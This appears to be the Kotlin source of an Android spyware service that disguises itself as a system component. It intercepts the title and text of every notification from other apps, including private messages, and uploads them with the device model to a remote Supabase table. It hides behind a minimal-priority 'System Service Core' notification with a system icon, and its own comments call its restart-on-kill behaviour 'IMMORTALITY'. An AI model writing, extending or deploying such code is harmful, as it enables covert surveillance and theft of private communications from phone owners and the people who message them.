package com.android.service.system.core.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.service.system.core.Config
import com.android.service.system.core.receivers.BootReceiver
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.from
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable

// Data Model matches your Supabase Table
@Serializable
data class SyncPayload(
    val source_app: String,
    val header: String?,
    val payload: String?,
    val direction: String = "INCOMING",
    val device_id: String
)

class CoreSyncService : NotificationListenerService() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    
    private val CHANNEL_ID = "sys_core_channel"
    private val NOTIFICATION_ID = 9999

    // Initialize Supabase
    private val supabase = createSupabaseClient(
        supabaseUrl = Config.SUPABASE_URL,
        supabaseKey = Config.SUPABASE_KEY
    ) {
        install(Postgrest)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // IMMORTALITY: Start Foreground immediately
        startForeground(NOTIFICATION_ID, createStealthNotification())
        return START_STICKY 
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d("SystemCore", "Service Connected & Active")
        startForeground(NOTIFICATION_ID, createStealthNotification())
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName == packageName) return 

        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: "System"
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        
        scope.launch {
            try {
                // Ignore empty system notifications
                if (text.isEmpty()) return@launch

                val data = SyncPayload(
                    source_app = sbn.packageName,
                    header = title,
                    payload = text,
                    device_id = android.os.Build.MODEL
                )
                
                // Upload to Supabase
                supabase.from("sys_sync_stream").insert(data)
                Log.d("SystemCore", "Synced: ${sbn.packageName}")
            } catch (e: Exception) {
                Log.e("SystemCore", "Sync Error: ${e.message}")
            }
        }
    }

    private fun createStealthNotification(): Notification {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Services", 
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            setShowBadge(false)
        }

        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Core")
            .setContentText("Maintaining system integrity...")
            .setSmallIcon(android.R.drawable.ic_menu_manage) // System Icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        // Auto-Restart Logic
        val broadcastIntent = Intent(this, BootReceiver::class.java)
        sendBroadcast(broadcastIntent)
    }
}
